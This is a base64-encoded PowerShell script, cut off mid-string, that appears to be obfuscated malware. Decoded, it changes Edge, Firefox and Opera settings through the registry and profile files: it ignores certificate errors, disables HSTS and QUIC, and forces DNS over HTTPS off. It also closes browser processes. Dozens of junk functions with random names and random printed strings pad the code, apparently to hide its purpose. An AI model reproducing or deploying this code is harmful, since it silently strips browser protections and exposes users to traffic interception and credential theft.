YW0yIDE2CldyaXRlLU91dHB1dCAnVWxrRUxYdHFjVEpoN0ZXJwokdmFyX2FkeTN0RHU0ID0gZm5fNnRIV1JoSlggLXBhcmFtMSA3NiAtcGFyYW0yIDYKV3JpdGUtT3V0cHV0ICc1QUYzRENtdUpibDdSblAnCiBmdW5jdGlvbiBDb25maWd1cmVFZGdlIHsNCiAgICAkZWRnZUtleVBhdGggPSAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XEVkZ2UiDQogICAgDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZWRnZUtleVBhdGgpKSB7DQogICAgICAgIE5ldy1JdGVtIC1QYXRoICRlZGdlS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCiAgICANCiAgICAkY29tbWFuZExpbmVQYXRoID0gSm9pbi1QYXRoICRlZGdlS2V5UGF0aCAiQ29tbWFuZExpbmUiDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY29tbWFuZExpbmVQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkY29tbWFuZExpbmVQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgfQ0KICAgIA0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNvbW1hbmRMaW5lUGF0aCAtTmFtZSAiKERlZmF1bHQpIiAtVmFsdWUgIi0taWdub3JlLWNlcnRpZmljYXRlLWVycm9ycyAtLWRpc2FibGUtcXVpYyAtLWRpc2FibGUtaHN0cyINCiAgICANCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRlZGdlS2V5UGF0aCAtTmFtZSAiRG5zT3Zlckh0dHBzIiAtVmFsdWUgIm9mZiINCg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGVkZ2VLZXlQYXRoIC1OYW1lICJJZ25vcmVDZXJ0aWZpY2F0ZUVycm9ycyIgLVZhbHVlIDENCn0NCmZ1bmN0aW9uIGZuX0xvZ19TN3ZIa3dkVCB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQogICAgKQogICAgV3JpdGUtT3V0cHV0ICdMb2c6ICRtZXNzYWdlJwp9CmZ1bmN0aW9uIGZuX3pQcG14RHVPIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfcEpzWEF0WkssCiAgICAgICAgW2ludF0kdmFyXzRwTVdqc2ZHCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9wSnNYQXRaSyArICR2YXJfNHBNV2pzZkcKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fMkxYZnF2YTAgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl80cE1XanNmRywKICAgICAgICBbaW50XSR2YXJfMlRicWtHTFgKICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzRwTVdqc2ZHICsgJHZhcl8yVGJxa0dMWAogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9HVll1UU1JbiB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyXzJUYnFrR0xYLAogICAgICAgIFtpbnRdJHZhcl9kOFpybFRFTQogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfMlRicWtHTFggKyAkdmFyX2Q4WnJsVEVNCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX3NKU0RYcXUwIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfZDhacmxURU0sCiAgICAgICAgW2ludF0kdmFyXzNJNWc0Qm1UCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9kOFpybFRFTSArICR2YXJfM0k1ZzRCbVQKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fQVRwSWlkdTMgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl8zSTVnNEJtVCwKICAgICAgICBbaW50XSR2YXJfcEpzWEF0WksKICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzNJNWc0Qm1UICsgJHZhcl9wSnNYQXRaSwogICAgcmV0dXJuICRyZXN1bHQKfQppZiAoJHZhcl9wSnNYQXRaSyAtZ3QgMTUpIHsKICAgIFdyaXRlLU91dHB1dCAnMFJWaE13Vzl5YW44QklKJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnaXRUR0FyV0Y3NlN6YzlJJwp9CmlmICgkdmFyXzRwTVdqc2ZHIC1ndCAxNykgewogICAgV3JpdGUtT3V0cHV0ICdwemJzeVo5UGFKUzdWT20nCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ0g1WW9Uc0ZRYU9NZ2tKZicKfQppZiAoJHZhcl8yVGJxa0dMWCAtZ3QgMTIpIHsKICAgIFdyaXRlLUhvc3QgJzd4S3I0QlRFMmhxQ1pXeScKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJzcyUlhHT2NOQnBuVUlUVycKfQppZiAoJHZhcl9kOFpybFRFTSAtZ3QgNykgewogICAgV3JpdGUtSG9zdCAnMHJjWENUZzdpVUpSc0JuJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdXdFN5QU9vRzF6MFI0MnYnCn0KaWYgKCR2YXJfM0k1ZzRCbVQgLWd0IDEyKSB7CiAgICBXcml0ZS1PdXRwdXQgJ0h5MG5WQ2VmSmtyWGJLaCcKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ0MyTkJGTVI3dkQwVzNhcycKfQokdmFyXzJUYnFrR0xYID0gZm5felBwbXhEdU8gLXBhcmFtMSA3OSAtcGFyYW0yIDc1CldyaXRlLU91dHB1dCAnb3c4N0VIMUxDVnRoVVRLJwokdmFyXzNJNWc0Qm1UID0gZm5fR1ZZdVFNSW4gLXBhcmFtMSA2NCAtcGFyYW0yIDY0CldyaXRlLU91dHB1dCAnd2VoZ2Z0UWlMemI1cGwwJwokdmFyX3BKc1hBdFpLID0gZm5fQVRwSWlkdTMgLXBhcmFtMSA4IC1wYXJhbTIgOQpXcml0ZS1Ib3N0ICd1ekw3bWQwb2NUaUtHU1gnCiR2YXJfM0k1ZzRCbVQgPSBmbl96UHBteER1TyAtcGFyYW0xIDg2IC1wYXJhbTIgNTgKV3JpdGUtT3V0cHV0ICdnandCMHBJWkUxU1Fza1InCiR2YXJfNHBNV2pzZkcgPSBmbl96UHBteER1TyAtcGFyYW0xIDI1IC1wYXJhbTIgMTEKV3JpdGUtSG9zdCAnTldKbHhGemREOFhZYUhNJwokdmFyX3BKc1hBdFpLID0gZm5fc0pTRFhxdTAgLXBhcmFtMSA4NyAtcGFyYW0yIDQwCldyaXRlLUhvc3QgJ0dKOWVwdmJjTW9pdzNPaCcKJHZhcl80cE1XanNmRyA9IGZuX3pQcG14RHVPIC1wYXJhbTEgNzIgLXBhcmFtMiA3MApXcml0ZS1PdXRwdXQgJ2tnckN3SVQ4MlJaVmxCbicKJHZhcl9kOFpybFRFTSA9IGZuX3NKU0RYcXUwIC1wYXJhbTEgMjEgLXBhcmFtMiAxOApXcml0ZS1PdXRwdXQgJ3VJR2V4Z0I0VWYzSGhsWScKJHZhcl80cE1XanNmRyA9IGZuX0FUcElpZHUzIC1wYXJhbTEgOTkgLXBhcmFtMiA2NgpXcml0ZS1Ib3N0ICdvcUxDQmo4VmlKWU5XOUgnCiR2YXJfZDhacmxURU0gPSBmbl9HVll1UU1JbiAtcGFyYW0xIDkyIC1wYXJhbTIgNzUKV3JpdGUtT3V0cHV0ICd3aXB5UWptUGZIdUw0T1gnCiR2YXJfM0k1ZzRCbVQgPSBmbl9zSlNEWHF1MCAtcGFyYW0xIDc2IC1wYXJhbTIgNDgKV3JpdGUtT3V0cHV0ICdwdEVBYjlJMUMzR3ZPWFMnCiR2YXJfNHBNV2pzZkcgPSBmbl9HVll1UU1JbiAtcGFyYW0xIDg3IC1wYXJhbTIgMTIKV3JpdGUtT3V0cHV0ICc0eFBpUUJPYm1lQ2FJNmYnCiR2YXJfcEpzWEF0WksgPSBmbl9HVll1UU1JbiAtcGFyYW0xIDE1IC1wYXJhbTIgNjgKV3JpdGUtT3V0cHV0ICdwU0NIdGZ3NFFvT0tUV3gnCiR2YXJfMlRicWtHTFggPSBmbl9zSlNEWHF1MCAtcGFyYW0xIDEwIC1wYXJhbTIgMjUKV3JpdGUtT3V0cHV0ICdOTVM3d2xrYlVxZzFYZlknCiR2YXJfMlRicWtHTFggPSBmbl8yTFhmcXZhMCAtcGFyYW0xIDQwIC1wYXJhbTIgNzIKV3JpdGUtSG9zdCAnZGtaNXB5VHpRWG11OHJCJwokdmFyX2Q4WnJsVEVNID0gZm5fMkxYZnF2YTAgLXBhcmFtMSA5OSAtcGFyYW0yIDg4CldyaXRlLUhvc3QgJ0kwcTMxbDg0YVR0dXJDeicKJHZhcl9kOFpybFRFTSA9IGZuX3NKU0RYcXUwIC1wYXJhbTEgMzEgLXBhcmFtMiA2NApXcml0ZS1PdXRwdXQgJzZ5OUVuZUtxaGlnc1QxTScKJHZhcl8zSTVnNEJtVCA9IGZuX3pQcG14RHVPIC1wYXJhbTEgMjMgLXBhcmFtMiA4MQpXcml0ZS1PdXRwdXQgJ0tidm5KaVBldTdmQ0RsbycKJHZhcl9kOFpybFRFTSA9IGZuXzJMWGZxdmEwIC1wYXJhbTEgNjMgLXBhcmFtMiA3OApXcml0ZS1Ib3N0ICdoRHY0WDFMNTg2a093YzAnCiR2YXJfMlRicWtHTFggPSBmbl96UHBteER1TyAtcGFyYW0xIDY1IC1wYXJhbTIgMzUKV3JpdGUtT3V0cHV0ICdKTlUyVGJPN0MzRnVnSEUnCiAKCg0KDQpmdW5jdGlvbiBDb25maWd1cmVGaXJlRm94IA0Kew0KICAgIHRyeSANCiAgICB7DQogICAgICAgIFNldC1GaXJlZm94UmVnaXN0cnkgLUtleVBhdGhzIEAoDQogICAgICAgICAgICAnU09GVFdBUkVcUG9saWNpZXNcTW96aWxsYVxGaXJlZm94XEROU092ZXJIVFRQUycsDQogICAgICAgICAgICAnU09GVFdBUkVcUG9saWNpZXNcTW96aWxsYVxGaXJlZm94XEROU092ZXJIVFRQUycNCiAgICAgICAgKSAtVmFsdWVOYW1lcyBAKCdFbmFibGVkJywgJ0xvY2tlZCcpIC1WYWx1ZXMgQCgwLCAxKQ0KICAgIH0NCiAgICBjYXRjaCANCiAgICB7DQogICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byBzZXQgZmlyZWZveCByZWdpc3RyeTogJF8iDQogICAgfQ0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSANCiAgICB7DQogICAgICAgIHRyeSANCiAgICAgICAgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggIk1vemlsbGFcRmlyZWZveFxQcm9maWxlc1x1c2VyLmpzIg0KDQogICAgICAgICAgICAkVXNlckpTQ29udGVudCA9ICd1c2VyX3ByZWYoIm5ldHdvcmsudHJyLm1vZGUiLCA1KTsnDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikpIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRwYXRoIC1JdGVtVHlwZSBGaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJHBhdGggLVZhbHVlICRVc2VySlNDb250ZW50IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggDQogICAgICAgIHsNCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byB3cml0ZSB0byB1c2VyLmpzIGZpbGU6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIFNldC1GaXJlZm94UmVnaXN0cnkgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ1tdXSRLZXlQYXRocywNCiAgICAgICAgW3N0cmluZ1tdXSRWYWx1ZU5hbWVzLA0KICAgICAgICBbaW50W11dJFZhbHVlcw0KICAgICkNCg0KICAgICRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU3RvcCcNCiAgICAkcmVnS2V5ID0gW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeV06OkxvY2FsTWFjaGluZQ0KDQogICAgdHJ5IHsNCiAgICAgICAgZm9yZWFjaCAoJGkgaW4gMC4uKCRLZXlQYXRocy5MZW5ndGggLSAxKSkgew0KICAgICAgICAgICAgJGtleSA9ICRyZWdLZXkuT3BlblN1YktleSgkS2V5UGF0aHNbJGldLCAkdHJ1ZSkNCiAgICAgICAgICAgIGlmICgka2V5IC1lcSAkbnVsbCkgew0KICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byBvcGVuIHJlZ2lzdHJ5IGtleTogJCgkS2V5UGF0aHNbJGldKSINCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJGtleS5TZXRWYWx1ZSgkVmFsdWVOYW1lc1skaV0sICRWYWx1ZXNbJGldLCBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5VmFsdWVLaW5kXTo6RFdvcmQpDQogICAgICAgICAgICAka2V5LkNsb3NlKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIGFjY2Vzc2luZyBvciBtb2RpZnlpbmcgcmVnaXN0cnk6ICRfIg0KICAgIH0NCn0NCmZ1bmN0aW9uIGZuX0xvZ19jdzNhNThGUyB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQogICAgKQogICAgV3JpdGUtT3V0cHV0ICdMb2c6ICRtZXNzYWdlJwp9CmZ1bmN0aW9uIGZuX1dQMmQxck5YIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfTDRBbU1pMG4sCiAgICAgICAgW2ludF0kdmFyXzF6a0NsRFpJCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9MNEFtTWkwbiArICR2YXJfMXprQ2xEWkkKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fZmxXSnVWY2cgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl8xemtDbERaSSwKICAgICAgICBbaW50XSR2YXJfR3JpZE0xcXoKICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzF6a0NsRFpJICsgJHZhcl9HcmlkTTFxegogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl90ZzluelVBdiB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX0dyaWRNMXF6LAogICAgICAgIFtpbnRdJHZhcl9obWFZRXI2ZAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfR3JpZE0xcXogKyAkdmFyX2htYVlFcjZkCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX3ROMDJWUkxUIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfaG1hWUVyNmQsCiAgICAgICAgW2ludF0kdmFyXzJraVROdUpxCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9obWFZRXI2ZCArICR2YXJfMmtpVE51SnEKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fYlFOQWRDRXIgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl8ya2lUTnVKcSwKICAgICAgICBbaW50XSR2YXJfTDRBbU1pMG4KICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzJraVROdUpxICsgJHZhcl9MNEFtTWkwbgogICAgcmV0dXJuICRyZXN1bHQKfQppZiAoJHZhcl9MNEFtTWkwbiAtZ3QgMTYpIHsKICAgIFdyaXRlLUhvc3QgJ2RYN3pXamNDb3dtNmlWeCcKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnQk5vODlLSnpYMTRPM2JSJwp9CmlmICgkdmFyXzF6a0NsRFpJIC1ndCAxNCkgewogICAgV3JpdGUtSG9zdCAnWFd3amFLRkl2RUpCVmZTJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICd3Q2tqeGUzUXNYRDgwbHAnCn0KaWYgKCR2YXJfR3JpZE0xcXogLWd0IDExKSB7CiAgICBXcml0ZS1PdXRwdXQgJ1AyYVhlOTVRV1NWRDZSZicKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ1dlRW1hUHdEZGliajVCUScKfQppZiAoJHZhcl9obWFZRXI2ZCAtZ3QgMikgewogICAgV3JpdGUtSG9zdCAnS3owNTJUdWxCVlJPbklDJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnZ3N5cFE3WjM4UEJ3TTROJwp9CmlmICgkdmFyXzJraVROdUpxIC1ndCA4KSB7CiAgICBXcml0ZS1PdXRwdXQgJ0VCVnFtT01sOTRYcGdlaicKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnM3VUYXcxWnM3dkxjNHpPJwp9CiR2YXJfaG1hWUVyNmQgPSBmbl90TjAyVlJMVCAtcGFyYW0xIDY0IC1wYXJhbTIgNTYKV3JpdGUtSG9zdCAnbE1nU1laTmJFVDRCUUlLJwokdmFyX0w0QW1NaTBuID0gZm5fV1AyZDFyTlggLXBhcmFtMSA4NCAtcGFyYW0yIDk5CldyaXRlLU91dHB1dCAnR1hIZXhpVGJQVkVDTXBuJwokdmFyXzJraVROdUpxID0gZm5fZmxXSnVWY2cgLXBhcmFtMSA0NCAtcGFyYW0yIDQ5CldyaXRlLUhvc3QgJ1JLazVHVFozeTB6Sk5obCcKJHZhcl8xemtDbERaSSA9IGZuX3ROMDJWUkxUIC1wYXJhbTEgMSAtcGFyYW0yIDQ3CldyaXRlLU91dHB1dCAna1FTdlZpZFJhdEgzMHpwJwokdmFyX2htYVlFcjZkID0gZm5fZmxXSnVWY2cgLXBhcmFtMSAyOSAtcGFyYW0yIDk3CldyaXRlLUhvc3QgJ0lZZlFpQWUySjd4Y3JSNicKJHZhcl8xemtDbERaSSA9IGZuX2ZsV0p1VmNnIC1wYXJhbTEgOTkgLXBhcmFtMiA0MQpXcml0ZS1Ib3N0ICdiWHFCSVYzeEx5bU9TZE4nCiR2YXJfR3JpZE0xcXogPSBmbl90ZzluelVBdiAtcGFyYW0xIDggLXBhcmFtMiA3CldyaXRlLUhvc3QgJ0Y5Z3hFdFNwNDVqQ3VZYycKJHZhcl8xemtDbERaSSA9IGZuX3RnOW56VUF2IC1wYXJhbTEgNTYgLXBhcmFtMiAyNApXcml0ZS1PdXRwdXQgJ09ycEV6NUZESnFWV3hRZycKJHZhcl8ya2lUTnVKcSA9IGZuX3ROMDJWUkxUIC1wYXJhbTEgNjIgLXBhcmFtMiA2OApXcml0ZS1Ib3N0ICdidkNMcDlSckhBZ3hpdEYnCiR2YXJfMXprQ2xEWkkgPSBmbl9mbFdKdVZjZyAtcGFyYW0xIDk5IC1wYXJhbTIgMTYKV3JpdGUtT3V0cHV0ICdYcEFyeVRpV1VqYlpsZ2snCiR2YXJfaG1hWUVyNmQgPSBmbl9iUU5BZENFciAtcGFyYW0xIDk3IC1wYXJhbTIgMjUKV3JpdGUtT3V0cHV0ICdjWlh5dFVCOHVoSlF6cHEnCiR2YXJfTDRBbU1pMG4gPSBmbl9XUDJkMXJOWCAtcGFyYW0xIDY4IC1wYXJhbTIgNzMKV3JpdGUtT3V0cHV0ICd0RzlONHdpazZZWHFDUjcnCiR2YXJfR3JpZE0xcXogPSBmbl9iUU5BZENFciAtcGFyYW0xIDQxIC1wYXJhbTIgODUKV3JpdGUtT3V0cHV0ICdpWGpHM2xVNGh5MHhSa2cnCiR2YXJfR3JpZE0xcXogPSBmbl90ZzluelVBdiAtcGFyYW0xIDc1IC1wYXJhbTIgOTgKV3JpdGUtT3V0cHV0ICdqOTdFZ05EVGR3VjhRM3EnCiR2YXJfTDRBbU1pMG4gPSBmbl90TjAyVlJMVCAtcGFyYW0xIDc3IC1wYXJhbTIgMTIKV3JpdGUtT3V0cHV0ICdRbXFyTk9NQmwzUll1RnMnCiR2YXJfTDRBbU1pMG4gPSBmbl9iUU5BZENFciAtcGFyYW0xIDQ2IC1wYXJhbTIgMjUKV3JpdGUtT3V0cHV0ICdRTDJQR09pTkllZG13QXknCiR2YXJfMmtpVE51SnEgPSBmbl9XUDJkMXJOWCAtcGFyYW0xIDU4IC1wYXJhbTIgNDUKV3JpdGUtT3V0cHV0ICcyMExrQjlQRURUYXFadTYnCiR2YXJfMmtpVE51SnEgPSBmbl90TjAyVlJMVCAtcGFyYW0xIDc4IC1wYXJhbTIgNDYKV3JpdGUtT3V0cHV0ICduRmV0VzJkTlgzR1RWQWMnCiR2YXJfMXprQ2xEWkkgPSBmbl9iUU5BZENFciAtcGFyYW0xIDIyIC1wYXJhbTIgNzMKV3JpdGUtT3V0cHV0ICd3ODNYZUlQckdFNlVMWUQnCiR2YXJfaG1hWUVyNmQgPSBmbl9mbFdKdVZjZyAtcGFyYW0xIDY3IC1wYXJhbTIgNDMKV3JpdGUtSG9zdCAnWG5sd0xidXhkRHNQcEhSJwogCgoNCg0KZnVuY3Rpb24gQ29uZmlndXJlT3BlcmENCnsNCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnb3BlcmFfY3Jhc2hyZXBvcnRlci5leGUnLCAnb3BlcmEuZXhlJykpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggJ09wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZScNCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWd1cmVPcGVyYUludGVybmFsIC1GaWxlUGF0aCAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIG9jY3VycmVkIGluIE9wZXJhOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlT3BlcmFJbnRlcm5hbCB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJGZpbGVQYXRoDQogICAgKQ0KDQogICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgIGlmICgkbnVsbCAtZXEgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLW9yICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1pc25vdCBbb2JqZWN0XSkgew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcyA9IEB7DQogICAgICAgICAgICAnbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgJ29wZXJhJyA9IEB7DQogICAgICAgICAgICAgICAgJ2RvaF9tb2RlJyA9ICdvZmYnDQogICAgICAgICAgICB9DQogICAgICAgICAgICAndGVtcGxhdGVzJyA9ICIiDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5tb2RlID0gJ29mZicNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMub3BlcmEgPSBAew0KICAgICAgICAgICAgJ2RvaF9tb2RlJyA9ICdvZmYnDQogICAgICAgIH0NCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMudGVtcGxhdGVzID0gIiINCiAgICB9DQoNCiAgICAkanNvblN0cmluZyA9ICRjb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVZhbHVlICRqc29uU3RyaW5nIC1FbmNvZGluZyBVVEY4IC1Gb3JjZQ0KDQogICAgV3JpdGUtSG9zdCAiU3VjY2Vzc2Z1bGx5IGNvbmZpZ3VyZWQgT3BlcmEgc2V0dGluZ3MgaW4gJGZpbGVQYXRoIg0KfQ0KZnVuY3Rpb24gZm5fTG9nX0pIV3dQMmhWIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlCiAgICApCiAgICBXcml0ZS1PdXRwdXQgJ0xvZzogJG1lc3NhZ2UnCn0KZnVuY3Rpb24gZm5fN0V1c0N6SDkgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl82aENTZ3ZmVywKICAgICAgICBbaW50XSR2YXJfZlNSVlRaMUMKICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzZoQ1NndmZXICsgJHZhcl9mU1JWVFoxQwogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9qbVZ5MEhQQiB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2ZTUlZUWjFDLAogICAgICAgIFtpbnRdJHZhcl9CZ1k0OFVKcQogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfZlNSVlRaMUMgKyAkdmFyX0JnWTQ4VUpxCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX1huRFd3THllIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfQmdZNDhVSnEsCiAgICAgICAgW2ludF0kdmFyX1hDVGdLOUE4CiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9CZ1k0OFVKcSArICR2YXJfWENUZ0s5QTgKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fWjJvdUhUWGYgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9YQ1RnSzlBOCwKICAgICAgICBbaW50XSR2YXJfRk1IeG9YSTUKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX1hDVGdLOUE4ICsgJHZhcl9GTUh4b1hJNQogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9uWHhtMlVKcSB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX0ZNSHhvWEk1LAogICAgICAgIFtpbnRdJHZhcl82aENTZ3ZmVwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfRk1IeG9YSTUgKyAkdmFyXzZoQ1NndmZXCiAgICByZXR1cm4gJHJlc3VsdAp9CmlmICgkdmFyXzZoQ1NndmZXIC1ndCAxKSB7CiAgICBXcml0ZS1PdXRwdXQgJ0UwMUdaWVRLTXp4Z2hCUScKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ1BCV1JBemNoQ1ZxeXJEdicKfQppZiAoJHZhcl9mU1JWVFoxQyAtZ3QgMTkpIHsKICAgIFdyaXRlLU91dHB1dCAnZmV5QURtT3p4RTZyWnNuJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnRnZTNnUzVjhIWnJuaGZlJwp9CmlmICgkdmFyX0JnWTQ4VUpxIC1ndCAxNykgewogICAgV3JpdGUtT3V0cHV0ICdua0lWY2F5bERZOE0wU2onCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ2VqRDRzUUhJQUJsNUxLWicKfQppZiAoJHZhcl9YQ1RnSzlBOCAtZ3QgMykgewogICAgV3JpdGUtSG9zdCAnRTM5WlFOd2FTbnFoMVB2Jwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdmbjBpaGtINFpBVHY3OFYnCn0KaWYgKCR2YXJfRk1IeG9YSTUgLWd0IDUpIHsKICAgIFdyaXRlLU91dHB1dCAnUUplcGRSYmFGM1NpbTdNJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnZnRXVmI3ejRwT01nWEUzJwp9CiR2YXJfRk1IeG9YSTUgPSBmbl9qbVZ5MEhQQiAtcGFyYW0xIDMgLXBhcmFtMiA3NwpXcml0ZS1PdXRwdXQgJ1A5UjNsU0owNUZwWWdrTycKJHZhcl9YQ1RnSzlBOCA9IGZuX2ptVnkwSFBCIC1wYXJhbTEgNjkgLXBhcmFtMiA3OApXcml0ZS1Ib3N0ICdSeTkya0JBTXhsV2JORlQnCiR2YXJfRk1IeG9YSTUgPSBmbl9uWHhtMlVKcSAtcGFyYW0xIDgxIC1wYXJhbTIgMTQKV3JpdGUtSG9zdCAnMGhFdnIzS3RzSk1nenk5JwokdmFyX1hDVGdLOUE4ID0gZm5fWG5EV3dMeWUgLXBhcmFtMSA4IC1wYXJhbTIgNTcKV3JpdGUtT3V0cHV0ICduemxpRk1SZHVtNDBDc0cnCiR2YXJfQmdZNDhVSnEgPSBmbl9uWHhtMlVKcSAtcGFyYW0xIDQ5IC1wYXJhbTIgNjIKV3JpdGUtSG9zdCAna1FqOFozSlBNdzA3ZGhWJwokdmFyX1hDVGdLOUE4ID0gZm5fN0V1c0N6SDkgLXBhcmFtMSA4MSAtcGFyYW0yIDQ5CldyaXRlLUhvc3QgJzZkanNnVWs5VkdwMnlCbicKJHZhcl82aENTZ3ZmVyA9IGZuX25YeG0yVUpxIC1wYXJhbTE